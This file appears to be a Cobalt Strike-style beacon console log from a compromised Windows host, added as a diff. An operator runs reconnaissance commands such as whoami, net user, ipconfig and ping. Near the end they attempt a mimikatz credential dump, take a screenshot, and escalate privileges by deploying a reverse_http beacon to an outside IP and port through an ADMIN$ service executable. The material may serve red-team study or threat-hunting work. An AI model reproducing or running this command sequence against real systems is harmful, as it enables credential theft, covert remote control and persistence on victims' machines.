@@ -1,0 +1,141 @@
+02/14 08:55:10 UTC [metadata] 115.195.38.176 <- 192.168.40.1; computer: DESKTOP-05LT20T; user: BccVictory; process: rundll32.exe; pid: 84; os: Windows; version: 10.0; build: 19042; beacon arch: x86 (x64)
+02/14 08:57:13 UTC [input] <user2> shell whoami
+02/14 08:57:13 UTC [task] <T1059> Tasked beacon to run: whoami
+02/14 08:57:13 UTC [checkin] host called home, sent: 37 bytes
+02/14 08:57:14 UTC [output]
+received output:
+desktop-05lt20t\bccvictory
+
+
+02/14 08:57:20 UTC [input] <user2> sleep 1
+02/14 08:57:20 UTC [task] <T1029> Tasked beacon to sleep for 1s
+02/14 08:57:23 UTC [checkin] host called home, sent: 16 bytes
+02/14 08:57:30 UTC [input] <user2> shell whoami
+02/14 08:57:30 UTC [task] <T1059> Tasked beacon to run: whoami
+02/14 08:57:30 UTC [checkin] host called home, sent: 37 bytes
+02/14 08:57:30 UTC [output]
+received output:
+desktop-05lt20t\bccvictory
+
+
+02/14 08:57:33 UTC [input] <user2> shell net user
+02/14 08:57:33 UTC [task] <T1059> Tasked beacon to run: net user
+02/14 08:57:34 UTC [checkin] host called home, sent: 39 bytes
+02/14 08:57:34 UTC [output]
+received output:
+
+\\DESKTOP-05LT20T 的用户帐户
+
+-------------------------------------------------------------------------------
+Administrator            BccVictory               DefaultAccount           
+Guest                    WDAGUtilityAccount       
+命令成功完成。
+
+
+
+02/14 08:57:38 UTC [input] <user2> ipconfig
+02/14 08:57:38 UTC [error] Unknown command: ipconfig
+02/14 08:57:41 UTC [input] <user2> shell ipconfig
+02/14 08:57:41 UTC [task] <T1059> Tasked beacon to run: ipconfig
+02/14 08:57:41 UTC [checkin] host called home, sent: 39 bytes
+02/14 08:57:42 UTC [output]
+received output:
+
+Windows IP 配置
+
+
+以太网适配器 以太网 2:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+以太网适配器 以太网:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+未知适配器 本地连接:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+无线局域网适配器 本地连接* 1:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+无线局域网适配器 本地连接* 2:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+以太网适配器 VMware Network Adapter VMnet1:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::922:3c65:59b3:e824%10
+   IPv4 地址 . . . . . . . . . . . . : 192.168.42.1
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 
+
+以太网适配器 VMware Network Adapter VMnet8:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::4407:9d94:271b:dfb1%19
+   IPv4 地址 . . . . . . . . . . . . : 192.168.40.1
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 
+
+无线局域网适配器 WLAN:
+
+   连接特定的 DNS 后缀 . . . . . . . : localdomain
+   本地链接 IPv6 地址. . . . . . . . : fe80::5575:61a6:31d7:6f7b%8
+   IPv4 地址 . . . . . . . . . . . . : 192.168.66.109
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 192.168.66.1
+
+以太网适配器 蓝牙网络连接:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+
+02/14 08:57:57 UTC [input] <user2> shell ping 192.168.66.230
+02/14 08:57:57 UTC [task] <T1059> Tasked beacon to run: ping 192.168.66.230
+02/14 08:57:57 UTC [checkin] host called home, sent: 50 bytes
+02/14 08:58:07 UTC [output]
+received output:
+
+正在 Ping 192.168.66.230 具有 32 字节的数据:
+请求超时。
+请求超时。
+
+
+02/14 08:58:11 UTC [output]
+received output:
+请求超时。
+
+
+02/14 08:58:17 UTC [output]
+received output:
+请求超时。
+
+192.168.66.230 的 Ping 统计信息:
+    数据包: 已发送 = 4，已接收 = 0，丢失 = 4 (100% 丢失)，
+
+
+02/14 08:59:58 UTC [input] <user2> logonpasswords
+02/14 08:59:58 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+02/14 08:59:58 UTC [checkin] host called home, sent: 296058 bytes
+02/14 09:00:00 UTC [output]
+received output:
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+
+02/14 09:00:08 UTC [checkin] host called home, sent: 12 bytes
+02/14 09:00:28 UTC [input] <user2> screenshot
+02/14 09:00:28 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+02/14 09:00:28 UTC [checkin] host called home, sent: 163939 bytes
+02/14 09:01:21 UTC [input] <user2> elevate svc-exe test
+02/14 09:01:22 UTC [task] <T1035, T1050> Tasked beacon to run windows/beacon_http/reverse_http (81.68.74.87:9900) via Service Control Manager (\\127.0.0.1\ADMIN$\fef9519.exe)
+02/14 09:01:22 UTC [indicator] service: \\. fef9519
+02/14 09:01:22 UTC [indicator] file: 3c431b36983e3453969bb5e686f55a9d 285696 bytes \\127.0.0.1\ADMIN$\fef9519.exe
